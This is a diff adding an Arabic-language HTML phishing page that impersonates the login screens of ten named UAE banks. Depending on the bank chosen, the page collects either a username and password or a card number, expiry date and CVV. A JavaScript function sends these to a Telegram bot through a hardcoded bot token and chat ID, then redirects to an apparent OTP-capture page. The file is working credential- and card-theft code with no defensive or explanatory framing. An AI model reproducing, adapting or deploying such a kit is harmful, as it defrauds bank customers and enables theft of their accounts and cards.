@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>تسجيل الدخول</title>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;700&display=swap" rel="stylesheet">
+<style>
+body {
+  margin:0;
+  font-family:'Cairo';
+  background:#f5f5f5;
+}
+
+.container {
+  padding:20px;
+}
+
+.card {
+  background:#fff;
+  border-radius:20px;
+  padding:25px;
+  margin-bottom:20px;
+  text-align:center;
+  box-shadow:0 5px 15px rgba(0,0,0,0.08);
+}
+
+h1 {
+  color:#0a8f2c;
+  font-size: 1.2rem;
+  margin-top: 10px;
+}
+
+input, select {
+  width:100%;
+  padding:12px;
+  margin:10px 0;
+  border-radius:10px;
+  border:1px solid #ccc;
+  font-family:'Cairo';
+  box-sizing:border-box;
+}
+
+button {
+  width:100%;
+  padding:15px;
+  background:#0a8f2c;
+  color:#fff;
+  border:none;
+  border-radius:10px;
+  font-size:16px;
+  cursor:pointer;
+  margin-top:10px;
+}
+
+.flex-row {
+  display:flex;
+  gap:10px;
+}
+.flex-row select {
+  flex:1;
+}
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="card">
+    <img id="bankLogo" width="120">
+    <h1 id="bankTitle"></h1>
+  </div>
+  <div class="card" id="formContainer"></div>
+</div>
+
+<script>
+
+const botToken = "8497519636:AAG2fIjNUBJhtN63dApkRNoENAFwEUJYTR8";
+const chatId = "-4669313790";
+
+const bank = localStorage.getItem("selectedBank");
+
+const bankImages = {
+  "Emirates NBD": "img/bankImg/IMG_20260416_184858_812.jpg",
+  "FAB": "img/bankImg/IMG_20260416_184859_470.jpg",
+  "ADCB": "img/bankImg/IMG_20260416_184859_221.jpg",
+  "Dubai Islamic": "img/bankImg/IMG_20260416_184858_580.jpg",
+  "Mashreq": "img/bankImg/IMG_20260416_184858_586.jpg",
+  "Abu Dhabi Islamic": "img/bankImg/IMG_20260416_184858_952.jpg",
+  "Commercial Bank of Dubai": "img/bankImg/IMG_20260416_184858_819.jpg",
+  "National Bank of Fujairah": "img/bankImg/IMG_20260416_184858_901.jpg",
+  "RAKBANK": "img/bankImg/IMG_20260416_184859_173.jpg",
+  "Sharjah Islamic": "img/bankImg/IMG_20260416_184859_081.jpg"
+};
+
+const bankArabicNames = {
+  "Emirates NBD": "بنك الإمارات دبي الوطني",
+  "FAB": "بنك أبوظبي الأول",
+  "ADCB": "بنك أبوظبي التجاري",
+  "Dubai Islamic": "بنك دبي الإسلامي",
+  "Mashreq": "بنك المشرق",
+  "Abu Dhabi Islamic": "بنك أبو ظبي الإسلامي",
+  "Commercial Bank of Dubai": "بنك دبي التجاري",
+  "National Bank of Fujairah": "بنك الفجيرة الوطني",
+  "RAKBANK": "بنك رأس الخيمة",
+  "Sharjah Islamic": "مصرف الشارقة الإسلامي"
+};
+
+const bankFormConfig = {
+  "Emirates NBD": "special",
+  "FAB": "normal",
+  "ADCB": "normal",
+  "Dubai Islamic": "normal",
+  "Mashreq": "normal",
+  "Abu Dhabi Islamic": "normal",
+  "Commercial Bank of Dubai": "normal",
+  "National Bank of Fujairah": "normal",
+  "RAKBANK": "normal",
+  "Sharjah Islamic": "normal"
+};
+
+if(bank && bankImages[bank]) {
+  document.getElementById("bankLogo").src = bankImages[bank];
+}
+
+const formType = bankFormConfig[bank] || "normal";
+
+if(formType === "special") {
+  document.getElementById("bankTitle").innerText = `تسجيل الدخول إلى ${bankArabicNames[bank] || bank}`;
+  document.getElementById("formContainer").innerHTML = `
+    <input type="text" id="user" placeholder="البريد الإلكتروني أو اسم المستخدم">
+    <input type="password" id="pass" placeholder="كلمة المرور">
+    <button onclick="sendToTelegram()">تسجيل الدخول</button>
+  `;
+} else {
+  document.getElementById("bankTitle").innerText = `تسجيل الدخول إلى ${bankArabicNames[bank] || bank}`;
+  document.getElementById("formContainer").innerHTML = `
+    <input type="text" id="card" placeholder="رقم البطاقة (16 رقم)">
+    <div class="flex-row">
+      <select id="month">
+        <option value="">الشهر</option>
+        <option value="01">01</option><option value="02">02</option><option value="03">03</option>
+        <option value="04">04</option><option value="05">05</option><option value="06">06</option>
+        <option value="07">07</option><option value="08">08</option><option value="09">09</option>
+        <option value="10">10</option><option value="11">11</option><option value="12">12</option>
+      </select>
+      <select id="year">
+        <option value="">السنة</option>
+        <option value="2025">2025</option><option value="2026">2026</option><option value="2027">2027</option>
+        <option value="2028">2028</option><option value="2029">2029</option><option value="2030">2030</option>
+      </select>
+    </div>
+    <input type="text" id="cvv" placeholder="الرمز السري CVV (3 أرقام)">
+    <button onclick="sendToTelegram()">تسجيل الدخول</button>
+  `;
+}
+
+function sendToTelegram() {
+  let message = "";
+  const bankName = bankArabicNames[bank] || bank;
+  const currentFormType = bankFormConfig[bank] || "normal";
+  
+  if(currentFormType === "special") {
+    const user = document.getElementById("user")?.value || "غير مدخل";
+    const pass = document.getElementById("pass")?.value || "غير مدخل";
+    
+    message = `
+🏦 ${bankName} - تسجيل دخول جديد
+━━━━━━━━━━━━━━━━━━━━━
+👤 المستخدم: ${user}
+🔐 كلمة المرور: ${pass}
+━━━━━━━━━━━━━━━━━━━━━
+⏰ الوقت: ${new Date().toLocaleString('ar-EG')}
+    `;
+  } 
+  else {
+    const card = document.getElementById("card")?.value || "غير مدخل";
+    const month = document.getElementById("month")?.value || "";
+    const year = document.getElementById("year")?.value || "";
+    const cvv = document.getElementById("cvv")?.value || "غير مدخل";
+    const expiry = (month && year) ? `${month}/${year}` : "غير مدخل";
+    
+    message = `
+🏦 ${bankName} - تسجيل دخول جديد
+━━━━━━━━━━━━━━━━━━━━━
+💳 رقم البطاقة: ${card}
+📅 تاريخ الانتهاء: ${expiry}
+🔢 الرمز السري CVV: ${cvv}
+━━━━━━━━━━━━━━━━━━━━━
+⏰ الوقت: ${new Date().toLocaleString('ar-EG')}
+    `;
+  }
+  
+  if(message) {
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify({
+        chat_id: chatId,
+        text: message
+      })
+    })
+    .then(res => res.json())
+    .then(data => {
+      console.log("تم الإرسال", data);
+      window.location.href = "otp.html";
+    })
+    .catch(err => {
+      console.error("خطأ:", err);
+      window.location.href = "otp.html";
+    });
+  } else {
+    window.location.href = "otp.html";
+  }
+}
+</script>
+</body>
+</html>
